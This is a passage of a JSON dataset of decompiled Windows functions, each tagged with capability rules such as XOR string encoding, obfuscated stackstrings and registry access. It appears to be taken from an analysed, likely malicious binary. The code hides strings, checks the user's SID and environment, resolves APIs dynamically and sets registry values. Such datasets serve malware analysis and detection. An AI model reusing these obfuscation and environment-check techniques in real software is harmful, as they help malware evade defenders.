var_28h = 0x3e57601a;\n    var_24h = var_24h & 0xff000000 | 0x4e0e5d;\n    var_1ch = 0x62315a79;\n    var_18h._0_2_ = 0x544e;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n    lpLibFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    var_8h = 6;\n    var_4h = 0;\n    var_ch = &var_2ch - lpLibFileName;\n    do {\n        iVar9 = var_4h + 1;\n        *(var_4h + lpLibFileName) = *(&var_1ch + var_4h % 6) ^ (var_4h + lpLibFileName)[&var_2ch - lpLibFileName];\n        var_4h = iVar9;\n    } while (iVar9 < 0xb);\n    var_34h = 0x23133a38;\n    var_30h = 0x2e080a77;\n    var_2ch = 0x1d67220e;\n    var_28h = 0x291f3a1c;\n    var_24h = 0x230c1140;\n    var_20h = 0x7a;\n    var_1ch = 0x477a4f6d;\n    var_18h._0_2_ = 0x7834;\n    uVar5 = (*pcVar7)(8, 0x16);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar9 = lpLibFileName;\n    iVar11 = 0;\n    do {\n        puVar1 = iVar11 + iVar6;\n        iVar10 = iVar11 % var_8h;\n        iVar11 = iVar11 + 1;\n        *puVar1 = *(&var_1ch + iVar10) ^ puVar1[&var_34h - iVar6];\n    } while (iVar11 < 0x15);\n    uVar5 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n    pcVar7 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar5);\n    uVar12 = var_14h;\n    if (pcVar7 == NULL) {\n        uVar12 = 0;\n    }\n    else {\n        (*pcVar7)(&var_44h);\n        uVar4 = var_3ah;\n        uVar3 = var_3ah & 0xffffff;\n        var_3ah = uVar3 | uVar12 << 0x18;\n        uVar8 = 0;\n        uVar2 = uVar12 & 0xff;\n        do {\n            if ((uVar2 | (uVar4 & 0xff0000) >> 8 | (uVar4 & 0xff00) << 8 | uVar3 << 0x18) == (&var_64h)[uVar8]) {\n                uVar12 = 1;\n            }\n            uVar8 = uVar8 + 1;\n        } while (uVar8 < 8);\n    }\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n    (*pcVar7)(uVar5);\n    return uVar12;\n}\n",
        "token_count": 1252
    },
    "0040b02f": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0040b02f(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint hObject;\n    int32_t StringSid;\n    uint dwBytes;\n    \n    iVar7 = 0;\n    dwBytes = 0;\n    hObject = 0;\n    StringSid = 0;\n    var_14h = 0;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &hObject);\n    iVar4 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n    pcVar2 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n    if (iVar4 != 0) {\n        (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(hObject, 1, 0, dwBytes, &dwBytes);\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if ((iVar4 == 0x7a) &&\n           (puVar5 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40, dwBytes),  var_18h = puVar5,  puVar5 != NULL)) {\n            iVar4 = (*pcVar2)(hObject, 1, puVar5, dwBytes, &dwBytes);\n            if ((iVar4 != 0) &&\n               ((iVar4 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidW)(*puVar5, &StringSid),  iVar4 != 0 &&\n                (StringSid != 0)))) {\n                var_34h = 0x46547530;\n                var_30h = 0x754e3446;\n                var_2ch = 0x345a464c;\n                var_28h = 0x46417552;\n                var_24h._0_2_ = 0x3477;\n                var_20h = 0x46797563;\n                var_1ch._0_2_ = 0x3477;\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                do {\n                    var_10h = 6;\n                    puVar1 = iVar7 + iVar4;\n                    iVar6 = iVar7 % 6;\n                    iVar7 = iVar7 + 1;\n                    *puVar1 = *(&var_20h + iVar6) ^ puVar1[&var_34h - iVar4];\n                } while (iVar7 < 0x12);\n                iVar6 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(iVar4, StringSid);\n                iVar7 = var_14h;\n                if (iVar6 == 0) {\n                    iVar7 = 1;\n                }\n                (*_sym.imp.KERNEL32.dll_LocalFree)(StringSid);\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                puVar5 = var_18h;\n            }\n            (*_sym.imp.KERNEL32.dll_GlobalFree)(puVar5);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    return iVar7;\n}\n",
        "token_count": 858
    },
    "0040bd9c": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040bd9c(void)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    uint lpString;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = 0x57534608;\n    var_14h = 0x5b0e1e1b;\n    var_10h = 0x1c1c5b5e;\n    var_ch._0_1_ = 0x6b;\n    puVar6 = &lpString;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_20h = 0;\n    var_8h = 0x3432346b;\n    var_4h._0_2_ = 0x7370;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    do {\n        var_1ch = 6;\n        puVar1 = iVar7 + iVar4;\n        iVar5 = iVar7 % 6;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_8h + iVar5) ^ puVar1[&var_18h - iVar4];\n    } while (iVar7 < 0xd);\n    iVar7 = (*_sym.imp.KERNEL32.dll_GetEnvironmentVariableA)(iVar4, &lpString, 0x104);\n    uVar2 = var_20h;\n    if (iVar7 != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrlenA)(&lpString);\n        iVar7 = fcn.00408fe7();\n        if (iVar7 == -0x69b4c9f2) {\n            uVar2 = 1;\n        }\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return uVar2;\n}\n",
        "token_count": 583
    },
    "0040debc": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040debc(void)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    code *pcVar9;\n    int16_t *piVar10;\n    uint Reserved;\n    uint var_c0h;\n    int16_t *lpData;\n    int32_t var_b8h;\n    int16_t *var_b4h;\n    int32_t lpValueName;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_81h;\n    uint var_7dh;\n    uint var_79h;\n    uint var_75h;\n    uint var_71h;\n    uint var_6dh;\n    uint var_69h;\n    uint var_65h;\n    uint var_61h;\n    uint var_5dh;\n    uint var_59h;\n    uint var_55h;\n    uint var_51h;\n    int32_t var_4dh;\n    int32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_21h;\n    uint32_t var_1dh;\n    uint var_19h;\n    uint var_15h;\n    uint var_11h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    Reserved = 1;\n    var_2ch = 0x44166420;\n    var_28h._0_2_ = 0x6436;\n    var_b8h = 5;\n    var_28h._2_1_ = 5;\n    stack0xffffffd7 = 0x8503173;\n    var_21h = 0x19440764;\n    var_1dh = 0x37730a64;\n    var_19h = 0x12641050;\n    var_15h = 0x8643c44;\n    var_11h._0_1_ = 0x73;\n    var_11h._1_1_ = 0x44;\n    var_11h._2_1_ = 0x50;\n    var_48h = 0x44736464;\n    var_44h._0_1_ = 0x50;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n    var_b4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_c0h = 0;\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_b4h;\n        iVar5 = iVar8 % var_b8h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_48h + iVar5) ^ puVar1[&var_2ch - var_b4h];\n    } while (iVar8 < 0x1e);\n    var_ach = 0x39204460;\n    var_a8h = 0x44473021;\n    var_a4h = 0x30263938;\n    var_a0h = 0x392a4441;\n    var_9ch = 0x447e301b;\n    var_98h = 0x30243926;\n    var_94h = 0x39204441;\n    var_90h = 0x445c3034;\n    var_8ch = 0x30333929;\n    var_88h._0_2_ = 0x446f;\n    var_34h = 6;\n    var_88h._2_1_ = 6;\n    stack0xffffff77 = 0x72300239;\n    var_81h = 0x1b390444;\n    var_7dh = 0x3d447430;\n    var_79h = 0x46302839;\n    var_75h = 0x17393f44;\n    var_71h = 0x23445c30;\n    var_6dh = 0x50302e39;\n    var_69h = 0x1b393644;\n    var_65h = 0x2a446330;\n    var_61h = 0x57302939;\n    var_5dh = 0x29392644;\n    var_59h = 0x8445430;\n    var_55h = 0x7c301739;\n    var_51h = 0x47393c44;\n    var_4dh._0_1_ = 0x30;\n    var_8h = 0x394f4433;\n    var_4h._0_2_ = 0x3047;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc1);\n    var_48h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_48h;\n        iVar5 = iVar8 % var_34h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_8h + iVar5) ^ puVar1[&var_ach - var_48h];\n    } while (iVar8 < 0x60);\n    *NULL = fcn.0040d659(0xf003f);\n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n    piVar10 = var_b4h;\n    if (*NULL != 0) {\n        var_40h = 0x59193976;\n        var_3ch = 0x395b333e;\n        var_38h = 0x334b5902;\n        var_8h = 0x59763935;\n        var_4h._0_2_ = 0x334b;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n        lpValueName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar8 = 0;\n        do {\n            puVar1 = iVar8 + lpValueName;\n            iVar5 = iVar8 % var_34h;\n            iVar8 = iVar8 + 1;\n            *puVar1 = *(&var_8h + iVar5) ^ puVar1[&var_40h - lpValueName];\n        } while (iVar8 < 0xc);\n        var_1dh = var_1dh & 0xff | 0x39562200;\n        var_19h = 0x1a534153;\n        var_15h = 0x35536956;\n        var_11h._0_1_ = 0x53;\n        var_3ch = 0x53585672;\n        var_38h = CONCAT22(var_38h._2_2_, 0x5335);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n        var_ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar8 = 0;\n        do {\n            puVar1 = iVar8 + var_ch;\n            iVar5 = iVar8 % var_34h;\n            iVar8 = iVar8 + 1;\n            *puVar1 = *(&var_3ch + iVar5) ^ puVar1[&var_1dh + (1 - var_ch)];\n        } while (iVar8 < 0xc);\n        var_21h = var_21h & 0xff | 0x1f703f00;\n        var_1dh = 0x46c2f72;\n        var_19h = 0x34c1b7a;\n        var_15h = 0x7d721470;\n        var_11h._0_1_ = 0x6c;\n        var_11h._1_1_ = 0x70;\n        var_11h._2_1_ = 0x7a;\n        var_34h = 0x727a706c;\n        var_30h._0_1_ = 0x4c;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        piVar10 = var_b4h;\n        iVar5 = 0;\n        var_8h = &var_21h + (1 - iVar8);\n        do {\n            puVar1 = iVar5 + iVar8;\n            iVar6 = iVar5 % var_b8h;\n            iVar5 = iVar5 + 1;\n            *puVar1 = *(&var_34h + iVar6) ^ puVar1[var_8h];\n        } while (iVar5 < 0x12);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(stack0xffffffb0, lpValueName, 0, 4, &Reserved, 4);\n        pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        piVar4 = lpData;\n        do {\n            iVar2 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar2 != var_c0h);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(stack0xffffffb0, var_ch, 0, 1, lpData, (piVar4 - (lpData + 1) >> 1) * 2)\n        ;\n        piVar4 = piVar10;\n        do {\n            iVar2 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar2 != var_c0h);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)\n                  (stack0xffffffb0, iVar8, 0, 1, piVar10, (piVar4 - (piVar10 + 1) >> 1) * 2);\n        fcn.0040d22c();\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(stack0xffffffb0);\n        uVar3 = (*pcVar7)(0, iVar8);\n        pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar7)(0, var_ch);\n        (*pcVar9)(uVar3);\n        uVar3 = (*pcVar7)(0, lpValueName);\n        (*pcVar9)(uVar3);\n    }\n    uVar3 = (*pcVar7)(0, var_48h);\n    (*pcVar9)(uVar3);\n    uVar3 = (*pcVar7)(0, piVar10);\n    (*pcVar9)(uVar3);\n    return 1;\n}\n",
        "token_count": 2571
    },
    "0040e4f4": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040e4f4(int32_t param_1)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = *0x41ca98;\n    var_14h = param_1;\n    if (*0x41cdb4 == NULL) {\n        var_4ch = 0x463f2821;\n        var_48h = 0x26187542;\n        var_44h = 0x67131c2a;\n        var_40h = 0x447e3019;\n        var_3ch = 0x22244330;\n        var_38h = 0x5504192c;\n        var_34h = 0x1f213315;\n        var_30h._0_2_ = 0x3018;\n        var_1ch = 0x70484776;\n        var_18h._0_2_ = 0x3076;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n        var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_8h = 6;\n        iVar8 = 0;\n        do {\n            puVar1 = iVar8 + var_10h;\n            iVar5 = iVar8 % 6;\n            iVar8 = iVar8 + 1;\n            *puVar1 = *(&var_1ch + iVar5) ^ puVar1[&var_4ch - var_10h];\n        } while (iVar8 < 0x1e);\n        var_2ch = 0xb452c32;\n        var_28h = 0x7b6a1413;\n        var_24h = 0x141a0119;\n        var_20h._0_1_ = 0x59;\n        var_1ch = 0x65374959;\n        var_18h._0_2_ = 0x7876;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar8 = var_10h;\n        iVar7 = 0;\n        do {\n            puVar1 = iVar7 + iVar5;\n            iVar6 = iVar7 % var_8h;\n            iVar7 = iVar7 + 1;\n            *puVar1 = *(&var_1ch + iVar6) ^ puVar1[&var_2ch - iVar5];\n        } while (iVar7 < 0xd);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar5, var_10h);\n        *0x41cdb4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n        pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar8);\n        (*pcVar4)(uVar3);\n        pcVar4 = *0x41cdb4;\n        if (*0x41cdb4 == NULL) goto code_r0x0040e648;\n    }\n    iVar8 = var_14h;\n    pcVar4 = (**0x41cdb4)(var_14h);\n    if (pcVar4 != '\\0') {\n        *0x41ca98 = iVar8 != 0;\n    }\ncode_r0x0040e648:\n    return pcVar4 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 1051
    },
    "0040e896": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040e896(int32_t param_1)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_38h;\n    uint var_34h;\n    uint var_2fh;\n    uint var_2bh;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpString2;\n    int32_t var_8h;\n    int32_t hHeap;\n    \n    iVar5 = 8;\n    lpString2 = param_1;\n    hHeap = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (param_1 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, hHeap * 2 + 0x1a);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        if (iVar3 != 0) {\n            var_8h = iVar3;\n            uVar2 = (*pcVar6)(8, hHeap * 2 + 6);\n            hHeap = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (hHeap != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar3, lpString2);\n                var_1ch = fcn.00403538();\n                var_1ch = var_1ch + 2;\n                var_38h = 0x6c004515;\n                var_18h = 6;\n                var_34h._0_1_ = 6;\n                stack0xffffffc9 = 0xe451e73;\n                var_2fh = 0x4473126c;\n                var_2bh._0_2_ = 0x6c45;\n                var_2bh._2_1_ = 0x6c;\n                stack0xffffffd4 = 0x6c6c4530;\n                var_24h._0_2_ = 0x7373;\n                uVar2 = (*pcVar6)(8, 0x21);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar5 = 0;\n                var_20h = iVar3;\n                do {\n                    puVar1 = iVar5 + iVar3;\n                    iVar4 = iVar5 % var_18h;\n                    iVar5 = iVar5 + 1;\n                    *puVar1 = *(&var_2bh + iVar4 + 3) ^ puVar1[&var_38h - iVar3];\n                } while (iVar5 < 0x10);\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                pcVar6 = _sym.imp.USER32.dll_wsprintfW;\n                (*_sym.imp.USER32.dll_wsprintfW)(var_1ch, iVar3, uVar2);\n                (*pcVar6)(hHeap, L\"\\\"%s\\\"\", lpString2);\n                pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                iVar5 = 8;\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x104);\n                lpString2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                if (lpString2 != 0) {\n                    var_18h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                    var_80h = 0x38221018;\n                    var_7ch = 0x7b441b3d;\n                    var_78h = 0x17547438;\n                    var_74h = 0x593c6776;\n                    var_70h = 0x597b7341;\n                    var_6ch = 0x3f735e73;\n                    var_68h = 0x33007359;\n                    var_64h = 0x415c7426;\n                    var_60h = 0x105e4767;\n                    var_5ch = 0x2c2f7602;\n                    var_58h = 0x6a221710;\n                    var_54h = 0x76555c71;\n                    var_50h = 0xb0d3b2d;\n                    var_4ch = 0x74216f76;\n                    var_48h = 0x382f326e;\n                    var_44h = 0x7a734159;\n                    var_40h._0_2_ = 0x7359;\n                    var_40h._2_1_ = 100;\n                    var_14h = 0x4a566479;\n                    var_10h._0_1_ = 0x54;\n                    uVar2 = (*pcVar6)(8, 0x44);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar5 = 0;\n                    do {\n                        var_1ch = 5;\n                        puVar1 = iVar5 + iVar4;\n                        iVar3 = iVar5 % 5;\n                        iVar5 = iVar5 + 1;\n                        *puVar1 = *(&var_14h + iVar3) ^ puVar1[&var_80h - iVar4];\n                    } while (iVar5 < 0x43);\n                    iVar7 = var_18h;\n                    uVar2 = (*_sym.imp.USER32.dll_wsprintfA)(lpString2, iVar4, var_18h, var_18h);\n                    iVar5 = fcn.00405811(uVar2);\n                    iVar3 = var_20h;\n                    if (iVar5 == 0) {\n                        iVar5 = fcn.0040ebec(iVar7);\n                    }\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpString2);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                }\n                uVar2 = (*pcVar6)(0, hHeap);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                uVar2 = (*pcVar6)(0, iVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                iVar3 = var_8h;\n            }\n            uVar2 = (*pcVar6)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n    }\n    return iVar5;\n}\n",
        "token_count": 1694
    },
    "0040f3d7": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040f3d7(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_28h = 0x1f460461;\n    var_24h = 0x3c5b530f;\n    var_20h = 0x4b080e41;\n    var_1ch._0_1_ = 0x37;\n    var_ch = 0x6b346d37;\n    var_8h._0_2_ = 0x327a;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    var_4h = 6;\n    iVar7 = 0;\n    do {\n        puVar1 = iVar7 + var_10h;\n        iVar5 = iVar7 % 6;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_ch + iVar5) ^ puVar1[&var_28h - var_10h];\n    } while (iVar7 < 0xd);\n    var_28h = 0xb452c32;\n    var_24h = 0x7b6a1413;\n    var_20h = 0x141a0119;\n    var_1ch._0_1_ = 0x59;\n    var_18h = 0x65374959;\n    var_14h._0_2_ = 0x7876;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar7 = var_10h;\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + iVar5;\n        iVar6 = iVar8 % var_4h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_18h + iVar6) ^ puVar1[&var_28h - iVar5];\n    } while (iVar8 < 0xd);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar5, var_10h);\n    (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar7);\n    (*pcVar2)(uVar4);\n    return;\n}\n",
        "token_count": 750
    },
    "004040b1": {
        "rules": [
            "contain obfuscated stackstrings",
            "create or open registry key",
            "contain loop",
            "get hostname",
            "query or enumerate registry value",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004040b1(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uchar *puVar9;\n    uint32_t uVar10;\n    char cVar11;\n    uint name;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint var_5ch;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint lpValueName;\n    uint var_18h;\n    uchar *var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint nSize;\n    uint hKey;\n    \n    uStack100 = *0x410a3c;\n    uStack104 = *0x410a38;\n    uStack108 = *0x410a34;\n    name = *0x410a30;\n    var_4ch = 0x6e657272;\n    puVar9 = 0x41caf8;\n    for (iVar6 = 0x10; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_48h = 0x72655674;\n    var_44h = 0x6e6f6973;\n    var_40h._0_1_ = 0;\n    var_5ch = *0x410a40;\n    uStack92 = *0x410a44;\n    uStack88 = *0x410a48;\n    uStack84 = *0x410a4c;\n    var_3ch = *0x410a20;\n    uStack60 = *0x410a24;\n    uStack56 = *0x410a28;\n    uStack52 = *0x410a2c;\n    var_2ch._0_1_ = 0;\n    var_28h = 0x74736e49;\n    var_24h = 0x446c6c61;\n    var_20h = 0x657461;\n    lpValueName = 0x49676552;\n    var_18h._0_2_ = 100;\n    nSize = 0;\n    var_10h = 0;\n    hKey = 0;\n    iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x20119, &hKey);\n    if (iVar6 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 200);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        puVar9 = puVar4;\n        for (iVar6 = 100; pcVar1 = _sym.imp.ADVAPI32.dll_RegQueryValueExA,  iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar9 = 0x30;\n            puVar9 = puVar9 + 1;\n        }\n        nSize = 200;\n        var_14h = puVar4;\n        iVar6 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, &var_3ch, 0, 0, puVar4, &nSize);\n        nSize = 4;\n        cVar11 = iVar6 != 0;\n        iVar6 = (*pcVar1)(hKey, &var_28h, 0, 0, &var_10h, &nSize);\n        pcVar2 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n        if (iVar6 